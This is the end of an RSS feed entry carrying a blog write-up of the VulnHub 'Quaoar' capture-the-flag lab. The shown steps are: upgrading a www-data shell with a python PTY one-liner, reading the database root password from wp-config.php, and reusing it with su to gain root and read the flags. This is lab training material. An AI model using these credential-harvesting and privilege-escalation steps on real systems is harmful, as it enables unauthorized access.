&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's look for flags! I've found the first one in &lt;b&gt;/home&lt;/b&gt; directory. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwxr-xr-x  2 root root 4096 Oct 22  2016 wpadmin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wpadmin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 12
drwxr-xr-x 2 root    root    4096 Oct 22  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root    root    4096 Oct 24  2016 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
2bafe61f03117ac66a73c3c514de796e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, it's time to escalate our privilages. And to my amusement, in &lt;b&gt;wp-config.php&lt;/b&gt; there was root password for &lt;b&gt;mysql&lt;/b&gt; database. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@Quaoar:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
www-data@Quaoar:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 3628
drwxr-xr-x  6 www-data www-data   4096 Oct 24  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 13 root     root       4096 Jan 15  2017 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    224 Oct 12  2016 CHANGELOG
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data  35147 Oct 12  2016 COPYING
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 652654 Oct 23  2016 Hack_The_Planet.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 281003 Oct 23  2016 Hack_The_Planet2.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 126042 Oct 23  2016 Hack_The_Planet3.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1241 Oct 12  2016 INSTALL
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1672 Oct 12  2016 LICENSE
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 756701 Oct 23  2016 Quaoar.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    954 Oct 12  2016 README.md
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 169045 Oct 23  2016 hack-planet-1280-amox-zone.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 261593 Oct 23  2016 hack-planet-high-definition-mobile.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 179812 Oct 23  2016 hacker-manifesto-ethical.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 616848 Oct 23  2016 hacking.jpg
drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 hsperfdata_tomcat6
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    100 Oct 24  2016 index.html
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 573058 Oct 23  2016 pososibo-ethical-hacking-hack-fond.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    271 Oct 24  2016 robots.txt
drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 tomcat6-tomcat6-tmp
drwxr-xr-x 13 www-data www-data   4096 Oct 12  2016 upload
drwxr-xr-x  5 www-data www-data   4096 Nov 30  2016 wordpress
www-data@Quaoar:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
www-data@Quaoar:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;wp-config.php

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'rootpassword!'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Will it work? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@Quaoar:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
su root
Password: rootpassword!
root@Quaoar:/var/www/wordpress# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@Quaoar:~# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 48
drwx------  6 root root 4096 Nov 30  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwx------  2 root root 4096 Oct  7  2016 .aptitude
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root  368 Jan 15  2017 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Oct 15  2016 .cache
&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;  1 root root   33 Oct 22  2016 flag.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Apr 19  2012 .profile
drwx------  2 root root 4096 Oct 26  2016 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 4740 Nov 30  2016 .viminfo
drwxr-xr-x  8 root root 4096 Jan 29  2015 vmware-tools-distrib
root@Quaoar:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have the last flag, together with the root access! &lt;/p&gt;
</description>
        <pubDate>Sat, 19 Aug 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-quaoar/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-quaoar/</guid>
      </item>
    
  </channel>
</rss>
